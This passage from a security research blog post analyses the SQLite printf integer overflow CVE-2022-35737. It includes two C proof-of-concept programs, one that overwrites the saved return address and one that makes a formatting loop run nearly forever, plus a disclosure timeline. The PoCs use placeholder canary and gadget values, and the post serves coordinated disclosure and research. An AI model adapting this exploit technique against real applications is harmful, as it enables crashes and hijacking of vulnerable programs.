<p><a href="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM.png?ssl=1"><img data-attachment-id="103023" data-permalink="https://blog.trailofbits.com/2022/10/25/sqlite-vulnerability-july-2022-library-api/screen-shot-2022-10-18-at-5-41-00-pm/" data-orig-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM.png?fit=1174%2C1244&amp;ssl=1" data-orig-size="1174,1244" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="Screen Shot 2022-10-18 at 5.41.00 PM" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM.png?fit=283%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM.png?fit=690%2C731&amp;ssl=1" src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM.png?resize=690%2C731&amp;ssl=1" alt="" width="690" height="731" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM.png?resize=966%2C1024&amp;ssl=1 966w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM.png?resize=283%2C300&amp;ssl=1 283w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM.png?resize=768%2C814&amp;ssl=1 768w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM.png?w=1174&amp;ssl=1 1174w" data-lazy-sizes="(max-width: 690px) 100vw, 690px" data-lazy-src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-5.41.00-PM.png?resize=690%2C731&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/></a></p>
<p>We want the loop at [1] to terminate with values of <code>i</code> and <code>n</code> set so that the calculation at [2] overflows, resulting in a value of <code>n</code> that is negative or less than <code>etBUFSIZE (70)</code> and <code>i</code> set to a relatively small positive integer value that is greater than <code>etBUFSIZE</code>. This would allow the loop at [3] to write beyond the bounds of the stack-allocated <code>bufpt</code>, but without causing the program to crash immediately by writing beyond the stack memory region.</p>
<p>Consider the string input that contains <code>0x7fffff00</code> single-quote (‘) characters, followed by a single <code>0xc0</code> byte (a unicode prefix) and then by enough <code>0x80</code> bytes to bring the total string length to <code>0x100000100</code> bytes (followed by a <code>NULL</code> byte). Let’s call this string <code>string1</code>, and think about what happens when this string is passed to <code>sqlite3_snprintf</code>:</p>
<pre>snprintf3_snprintf(len, buf, “‘%!q’”, string1) </pre>
<p>(Notice that we’ve changed the format string to allow unicode characters by providing the <code>!</code> character.)</p>
<p>When the loop at [1] scans the first <code>0x7fffff00</code> bytes of <code>string1</code>, <code>n</code> and <code>i</code> both increment to <code>0x7fffff00</code>. On the next loop iteration, the program reads the unicode character prefix from the input string and enters the inner loop, where <code>i</code> is represented with 64-bit unsigned semantics. The <code>i</code> variable increments to <code>0x100000100</code> before a <code>NULL</code> byte is encountered, causing the inner loop to terminate. At this point in program execution, <code>n=0x7fffff00</code> and, when downcast to a 32-bit value, <code>i=0x100</code>. If the loop at [1] terminated at this point, the computation <code>n+=i+3</code> would result in <code>n=0x80000003</code>, which is negative when treated as a signed value. Meanwhile, <code>i</code> is now a small positive integer but is greater than <code>70 (etBUFSIZE)</code>, which would result in a stack buffer overflow when <code>256 (0x100)</code> bytes are read into a stack buffer of 70 bytes. This shows progress towards our goal: An extra couple of hundred bytes written to the stack are unlikely to reach the end of the stack memory region, but they are likely to reach interesting data saved on the stack, like saved return addresses and stack canaries. We can determine the exact position of this data on the stack by inspecting the target binary, and then adjust the input string size to control how much data is overwritten to the stack buffer.</p>
<p>Unfortunately, this approach will not work as-is, because the loop at [1] does not terminate at the point described above. Because of the divergent representations of the <code>i</code> variable, <code>escarg[i+1]</code> at line 828 (inner loop) will represent <code>i</code> as <code>0x100000100</code> and read a <code>NULL</code> byte at the end of our large string, but <code>escarg[i]</code> at line 825 (outer loop) will represent <code>i</code> as <code>0x100</code> and instead read a single-quote character (<code>‘</code>) from near the beginning of the input string. As a result, the loop exit condition is not met and the loop continues, with <code>i=0x100</code> and <code>n=0x7fffff00</code>. Notably, by this point <code>k</code> has decremented <code>0x7fffff00</code> times. Because there is no NULL byte in the input string in the first 231 bytes, <code>escarg[i]</code> will never read a <code>NULL</code> byte at line 825, and we have to instead depend on <code>k</code> decrementing to <code>0</code> in order to exit the loop at [1]. We can accomplish this by allowing the outer loop to continue incrementing until <code>k</code> has decremented all the way to <code>0</code>, but with specially calculated values for <code>n</code> and <code>i</code>.</p>
<p>With this thought in mind, we can take the same approach described above, which is to increment <code>n</code> to a very large positive value by supplying single-quote characters in the input string, and to then set <code>i</code> to a small positive value by supplying unicode characters to increment <code>i</code> using 64-bit unsigned semantics. We calculate our values by accounting for the fact that the outer loop will increment 232 times because <code>k</code> needs to decrement from <code>0xffffffff</code> to <code>0</code>.</p>
<p>Our <a href="https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/snprintf-control-pc.c" rel="noopener" target="_blank">proof of concept</a> uses this insight to control the number of bytes that overflow the stack-allocated buffer and overwrite the saved return address and stack canary:</p>
<pre title="">#include &lt;assert.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sqlite3.h&gt;

// Offsets relative to sqlite3_str_vappendf stack frame base. Calculated using
// the version of libsqlite3.so.0.8.6 provided by apt on Ubuntu 20.04.
#define RETADDR_OFFSET  0
#define CANARY_OFFSET   0x40
#define BUF_OFFSET      0x88
#define CANARY          0xbaadd00dbaadd00dull
#define ROPGADGET       0xdeadbeefdeadbeefull
#define NGADGETS        1

struct payload {
    uint8_t padding1[BUF_OFFSET-CANARY_OFFSET];
    uint64_t canary;
    uint8_t padding2[CANARY_OFFSET-RETADDR_OFFSET-8];
    uint64_t ropchain[NGADGETS];
}__attribute__((packed, aligned(1)));

int main(int argc, char *argv[]) {
    char dst[256];
    struct payload p;
    memset(p.padding1, &#39;a&#39;, sizeof(p.padding1));
    p.canary = CANARY;
    memset(p.padding2, &#39;b&#39;, sizeof(p.padding2));
    p.ropchain[0] = ROPGADGET;

    size_t target_n = 0x80000000;
    assert(sizeof(p) + 3 &lt;= target_n);
    size_t n = target_n - sizeof(p) - 3;
    size_t target_i = 0x100000000 + (sizeof(p) / 2);

    char *src = calloc(1, target_i);
    if (!src) { printf(&#34;bad allocation\n&#34;); return -1; }

    size_t cur = 0;
    memcpy(src, &amp;p, sizeof(p));
    cur += sizeof(p);
    memset(src+cur, &#39;\&#39;&#39;, n/2);
    cur += n/2;
    assert(cur &lt; 0x7ffffffeul);
    memset(src+cur, &#39;c&#39;, 0x7ffffffeul-cur);
    cur += 0x7ffffffeul-cur;
    src[cur] = &#39;\xc0&#39;;
    cur++;
    memset(src+cur, &#39;\x80&#39;, target_i - cur);
    cur = target_i;
    src[cur-1] = &#39;\0&#39;;

    sqlite3_snprintf((int) 256, dst, &#34;&#39;%!q&#39;&#34;, src);
    free(src);
    return 0;
}
</pre>
<div id="attachment_103032"><p><a href="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGAERT-Abort.png?ssl=1"><img aria-describedby="caption-attachment-103032" data-attachment-id="103032" data-permalink="https://blog.trailofbits.com/2022/10/25/sqlite-vulnerability-july-2022-library-api/fish-a-out-terminated-by-signal-sigaert-abort/" data-orig-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGAERT-Abort.png?fit=775%2C70&amp;ssl=1" data-orig-size="775,70" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="fish .a.out terminated by signal SIGAERT (Abort)" data-image-description="" data-image-caption="&lt;p&gt;This proof of concept causes the program to crash, but with a SIGABRT rather than a SIGSEGV. This implies that a stack canary was overwritten and that the vulnerable function tried to return. This is in contrast to the earlier crashing proof of concept that crashed before reaching the function return.&lt;/p&gt;
" data-medium-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGAERT-Abort.png?fit=300%2C27&amp;ssl=1" data-large-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGAERT-Abort.png?fit=690%2C62&amp;ssl=1" src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGAERT-Abort.png?resize=690%2C62&amp;ssl=1" alt="" width="690" height="62" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGAERT-Abort.png?w=775&amp;ssl=1 775w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGAERT-Abort.png?resize=300%2C27&amp;ssl=1 300w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGAERT-Abort.png?resize=768%2C69&amp;ssl=1 768w" data-lazy-sizes="(max-width: 690px) 100vw, 690px" data-lazy-src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/fish-.a.out-terminated-by-signal-SIGAERT-Abort.png?resize=690%2C62&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/></a></p><p id="caption-attachment-103032">This proof of concept causes the program to crash, but with a SIGABRT rather than a SIGSEGV. This implies that a stack canary was overwritten and that the vulnerable function tried to return. This is in contrast to the earlier crashing proof of concept that crashed before reaching the function return.</p></div>
<p>To confirm that we have successfully controlled the saved return address and stack canary, we can use GDB to view the stack frame before the vulnerable function returns:</p>
<div id="attachment_103034"><p><a href="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM.png?ssl=1"><img aria-describedby="caption-attachment-103034" data-attachment-id="103034" data-permalink="https://blog.trailofbits.com/2022/10/25/sqlite-vulnerability-july-2022-library-api/screen-shot-2022-10-18-at-6-01-02-pm/" data-orig-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM.png?fit=1250%2C844&amp;ssl=1" data-orig-size="1250,844" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="Screen Shot 2022-10-18 at 6.01.02 PM" data-image-description="" data-image-caption="&lt;p&gt;Executing the proof of concept in a debugger shows that the saved return address is set to 0xdeadbeefdeadbeef.&lt;/p&gt;
" data-medium-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM.png?fit=300%2C203&amp;ssl=1" data-large-file="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM.png?fit=690%2C466&amp;ssl=1" src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM.png?resize=690%2C466&amp;ssl=1" alt="" width="690" height="466" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM.png?resize=1024%2C691&amp;ssl=1 1024w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM.png?resize=300%2C203&amp;ssl=1 300w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM.png?resize=768%2C519&amp;ssl=1 768w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM.png?resize=1200%2C810&amp;ssl=1 1200w, https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM.png?w=1250&amp;ssl=1 1250w" data-lazy-sizes="(max-width: 690px) 100vw, 690px" data-lazy-src="https://i0.wp.com/blog.trailofbits.com/wp-content/uploads/2022/10/Screen-Shot-2022-10-18-at-6.01.02-PM.png?resize=690%2C466&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/></a></p><p id="caption-attachment-103034">Executing the proof of concept in a debugger shows that the saved return address is set to <code>0xdeadbeefdeadbeef</code>.</p></div>
<p>Note that in a non-contrived scenario, a real stack canary will contain a <code>NULL byte</code>, which would defeat the proof of concept above because the <code>NULL</code> byte will cause the string-scanning loop to terminate before the entire payload is copied over the return address. Clever exploitation techniques or specific format string conditions may allow an attacker to bypass this, but our intention is to show that the saved return address can be overwritten.</p>
<h3>Looping (Nearly) Forever</h3>
<p>We took our exploitation one step further and developed a <a href="https://github.com/trailofbits/publications/blob/master/disclosures/CVE-2022-35737/snprintf-livelock.c" rel="noopener" target="_blank">proof of concept</a> that uses the divergent representations of the <code>i</code> variable to cause loop [1] to iterate nearly infinitely by incrementing <code>i</code> 264 times, which effectively takes forever. This is achieved by causing the inner loop to increment <code>i</code> 232 times on every iteration of loop [1], which will also increment 232 times. The interesting part of this proof of concept is that it doesn’t actually reach the vulnerable integer overflow computation on line 832, but uses only the undefined behavior that results from allowing string inputs larger than what can be represented with 32-bit integers. All that is required is to fill a buffer of <code>0x100000000</code> bytes with unicode prefix characters (a single byte of <code>0xc0</code> followed by bytes of <code>0x80</code>), and the loop at [1] will never terminate:</p>
<pre title="">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sqlite3.h&gt;
#include &lt;unistd.h&gt;

int main(int argc, char *argv[]) {
    size_t src_buf_size = 0x100000001;

    char *src = calloc(1, src_buf_size);
    if (!src) {
        printf(&#34;bad allocation\n&#34;);
        return -1;
    }
    src[0] = &#39;\xc0&#39;;
    memset(src+1, &#39;\x80&#39;,  0xffffffff);

    char dst[256];
    sqlite3_snprintf(256, dst, &#34;&#39;%!q&#39;&#34;, src);
    free(src);
    return 0;
}
</pre>
<p>We showed that CVE-2022-35737 is exploitable when large string inputs are passed to the SQLite implementations of the <code>printf</code> functions and when the format string contains the <code>%Q</code>, <code>%q</code>, or <code>%w</code> format substitution types. This is enough to cause the program to crash. We also showed that if the format string additionally allows for unicode characters by providing the <code>!</code> character, then it is possible to overwrite the saved return address and to cause the program to loop (nearly) infinitely.</p>
<h2>But, SQLite is well-tested, right?</h2>
<p>SQLite is extensively tested with 100% branch test coverage. We discovered this vulnerability despite the tests, which raises the question: how did the tests miss it?</p>
<p>SQLite maintains an internal memory limit of 1GB, so the vulnerability is not reachable in the SQLite program. The problem is “defined away” by the notion that SQLite does not support big strings necessary to trigger this vulnerability.</p>
<p>However, the C APIs provided by SQLite do not enforce that their inputs adhere to the memory limit, and applications are able to call the vulnerable functions directly. The notion that large strings are unsupported by SQLite is not communicated with the API, so application developers cannot know how to enforce input size limits on these functions. When this code was first written, most processors had 32-bit registers and 4GB of addressable memory, so allocating 1GB strings as input was impractical. Now that 64-bit processors are quite common, allocating such large strings is feasible and the vulnerable conditions are reachable.</p>
<p>Unfortunately, this vulnerability is an example of one where extensive branch test coverage does not help, because no new code paths are introduced. 100% branch coverage says that every line of code has been executed, but not how many times. This vulnerability is the result of invalid data that causes code to execute billions of times more than it should.</p>
<p>The thoroughness of SQLite’s tests is remarkable — the discovery of this vulnerability should not be taken as a knock on the robustness of the tests. In fact, we wish more projects put as much emphasis on testing as SQLite does. Nonetheless, this bug is evidence that even the best-tested software can have exploitable bugs.</p>
<h2>Conclusion</h2>
<p>Not every system or application that uses the SQLite <code>printf</code> functions is vulnerable. For those that are, CVE-2022-35737 is a critical vulnerability that can allow attackers to crash or control programs. The bug has been particularly interesting to analyze, for a few reasons. For one, the inputs required to reach the bug condition are very large, which makes it difficult for traditional fuzzers to reach, and so techniques like static and manual analysis were required to find it. For another, it’s a bug that may not have seemed like an error at the time that it was written (dating back to 2000 in the SQLite source code) when systems were primarily 32-bit architectures. And—most interestingly to us at Trail of Bits—its exploitation was made easier by the discovered “divergent representations” of the same source variable, which we explore further in a separate blog post.</p>
<p>I’d like to thank my mentor, Peter Goodman, for his expert guidance throughout my summer internship with Trail of Bits. I’d also like to thank Nick Selby for his help in navigating the responsible disclosure process, and all members of the Trail of Bits team who assisted in advising and writing this blog post.</p>
<h2>Coordinated disclosure</h2>
<p><strong>July 14, 2022:</strong> Reported vulnerability to the Computer Emergency Response Team (CERT) Coordination Center.</p>
<p>We would like to thank the teams at SQLite and CERT/CC for working swiftly with us to address these issues.</p>
			</div><!-- .entry-content -->

	
</article></div>
  </body>
</html>
